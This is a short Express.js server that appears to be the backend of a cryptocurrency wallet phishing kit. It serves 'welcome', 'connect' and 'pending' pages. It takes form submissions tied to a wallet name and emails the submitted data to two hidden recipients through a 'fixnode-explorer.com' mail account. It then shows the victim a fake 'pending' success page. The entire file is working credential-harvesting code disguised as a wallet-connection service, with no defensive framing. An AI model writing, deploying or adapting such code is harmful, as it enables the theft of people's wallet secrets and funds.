const express = require('express')
const bodyParser = require('body-parser')
const nodemailer = require('nodemailer')
const dotenv = require('dotenv')
const app = express()
dotenv.config()

const PORT = 5500 
const PASSWORD = process.env.PASSWORD
const RECIPIENT1 = process.env.RECIPIENT1
const RECIPIENT2 = process.env.RECIPIENT2
const FROM = process.env.FROM

app.use(express.static("views"))
app.use(express.static(__dirname + "/public/"))
app.use(express.static(__dirname + "/views/index_files/"))
app.use(express.static(__dirname + "/views/Welcome to our website_files/"))
app.use(express.static(__dirname + "/views/connect_files/"))
app.use(express.static(__dirname + "/views/pending_files/"))
app.use(bodyParser.urlencoded({ extended: true }))

function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}


app.get('/', (req, res) => {
    res.sendFile(__dirname + '/views/index.html')
})

app.get('/welcome', (req, res) => {
    res.sendFile(__dirname + '/views/Welcome to our website.html')
})

app.get('/connect/pending/success', (req, res) => {
    res.sendFile(__dirname + '/views/pending.html')
})

app.get('/welcome/connect/:id', (req, res) => {
    res.sendFile(__dirname + '/views/connect.html')
})

app.post('/welcome/connect/:id/submit', async (req, res) => {
    const transporter = nodemailer.createTransport({
        service: 'zoho',
        auth: {
            user: "forwarding@fixnode-explorer.com",
            pass: PASSWORD
        }
    })

    await new Promise((resolve, reject) => {
        transporter.verify(function(error, success) {
          if (error){
            console.log(error)
            reject(error)
          }else{
            console.log('Server succesfully ready to send mail')
            resolve(success)
          }
        })
    })

    const recipients = [RECIPIENT1, RECIPIENT2]
    for(let recipient of recipients) {
        const mailOptions = {
            from: FROM,
            to: recipient,
            subject: `${req.body.category}`,
            html: `Wallet Name(s): ${req.params.id} <br> ${req.body.data}`
        }

        await new Promise((resolve, reject) => {
            transporter.sendMail(mailOptions, (error, info) => {
                if (error) {
                    console.log(error);
                    reject(error);
                }else{
                    console.log(`Email sent to ${recipient}: ` + info.response);
                    resolve(info);
                }

            })
        })
    }

    await delay(2000)
    res.redirect('/connect/pending/success')
})



app.listen(PORT, () => {
    console.log(`Server started on PORT: ${PORT}...`)
})